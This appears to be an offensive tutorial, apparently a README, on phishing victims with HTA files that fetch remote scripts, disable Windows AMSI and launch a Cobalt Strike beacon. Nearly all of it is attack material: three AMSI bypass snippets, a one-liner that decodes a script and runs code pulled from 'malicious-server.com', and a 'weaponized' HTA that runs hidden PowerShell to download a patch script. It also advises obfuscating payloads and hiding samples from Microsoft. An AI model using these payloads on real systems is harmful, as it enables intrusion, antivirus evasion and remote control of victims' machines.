# Gaining initial access with HTA
Instruction on gaining initial access using mshta.exe to execute HTA files

## 1. 📚 Overview
**Basic HTA Payload**
```html
<html>
  <head><title>Pwned by zagnox</title></head>
  <body>
  <p>Hello World!</p>
  </body>

  <script language="VBScript">
    Set shell = CreateObject("wscript.Shell")
    shell.run "notepad.exe"
  </script>
</html>
```
The payload above will run benign programs such as notepad or calc. If the operator attempts to drop and execute a beacon, it will most likely get **snagged by Windows Defender or other AV solutions**.

Although HTA attacks have been around for a while they are still a solid **STAGING** mechanism. In this technique I will explain the steps on how to use HTA files as simple stagers to load scripts from remote servers, patch/crash AMSI (Anti-Malware Scan Interfrace) to evade detection and then execute a web scripted delivery by Cobalt Strike to spawn a beacon.

1. Operator delivers the HTA application via email
2. Victim clicks on the application
3. VBScript runs and pulls malicious AMSI patch from remote server
4. Script launches hidden powershell and patches AMSI
5. Patched AMSI powershell session executes Cobalt-Strike beacon from remote server
6. Establish C2 communication with teamserver

---

## 2. 🍳 Crafting AMSI patching script
The operator has a couple of options to kill AMSI. The laziest option is to generate the script from [amsi.fail](https://amsi.fail/) collection. This script generator uses random trechniques from a collection of scripts. Although amsi.fail generates unique signatues at runtime for each payload they are sometimes snagged by AV. Test the payload in your lab to make sure you are successfully pathcing AMSI before serving it to your target.

⚠️ NOTE: It is important to **DISABLE Automatic Sample Submission** while experimenting in you lab. You DO NOT WANT your scripts to be sent to Microsoft sandboxes for further analysis.

The other options to patch AMSI are shown below. The powershell snippets can be tweaked and modified in order to execute and kill AMSI. Remember to use obfuscation techniques to evade defender for the scripts below.
- **Memory Patching (In-Memory AMSI Bypass)**

  By default, AmsiScanBuffer returns a status indicating whether a scan was successful. By forcing it to return AMSI_RESULT_CLEAN, all scripts will be marked as safe.
  ```powershell
  [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') |
  Get-Field -BindingFlags NonPublic,Static -Name 'amsiInitFailed' |
  Set-Value $true
  ```

- **Overwrite AmsiScanBuffer**

  Overwrite AmsiScanBuffer in memory so it always returns 0 (clean).
  ```powershell
  using System;
  using System.Runtime.InteropServices;
  
  class Program
  {
      [DllImport("kernel32")]
      static extern IntPtr GetModuleHandle(string lpModuleName);
  
      [DllImport("kernel32")]
      static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
  
      [DllImport("kernel32")]
      static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
  
      static void Main()
      {
          IntPtr amsiDll = GetModuleHandle("amsi.dll");
          IntPtr amsiScanBuffer = GetProcAddress(amsiDll, "AmsiScanBuffer");
          
          uint oldProtect;
          VirtualProtect(amsiScanBuffer, 0x0010, 0x40, out oldProtect);
          
          // Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN (0)
          Marshal.WriteByte(amsiScanBuffer, 0xC3); // RET instruction
          
          VirtualProtect(amsiScanBuffer, 0x0010, oldProtect, out oldProtect);
      }
  }
  
- **Hooking AMSI API Calls**

  Instead of patching AMSI in memory, you can hook AmsiScanBuffer and return a clean result.

  ```powershell
  $memory = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
  [System.Runtime.InteropServices.Marshal]::WriteByte($memory, 0xC3) # RET instruction
  [System.Runtime.InteropServices.Marshal]::Copy($memory, 0, [System.Runtime.InteropServices.Marshal]::GetFunctionPointerForDelegate(
    [System.Delegate]::CreateDelegate([System.Func[IntPtr, IntPtr, uint, uint]], $memory)), 1)

  ```


A fairly simple way to chain the commands is to embed the Cobalt Strike web-scripted delivery to execute after the script has been executed:
```powershell
[sYStEm.tEXt.enCOdIng]::unICOdE.GetsTrIng([SystEm.conVERT]::fRoMBaSe64string("base64 encode script here")) | IEX; IEX (curl 'http://malicious-server.com/beacon')
```

## 3. ☣️ Weaponizing the HTA

Once you have a script that will patch AMSI it is time to weaponize the HTA payload:

```html
<html>
  <head><title>BE CREATIVE</title></head>
  <body>
  <p>Hi! This is an important notification!</p>
  </body>

  <script language="VBScript">
    Set shell = CreateObject("wscript.Shell")
    shell.run "powershell -nop -w -hidden -e <base64 this IEX (curl http://malicious-server.com/patch-amsi.ps1)>"
  </script>
</html>
```
## 

![Patching amsi and executing beacon. AV evaded](https://github.com/user-attachments/assets/e66b2048-0a56-4bdc-ad4d-b434f880fb1f)
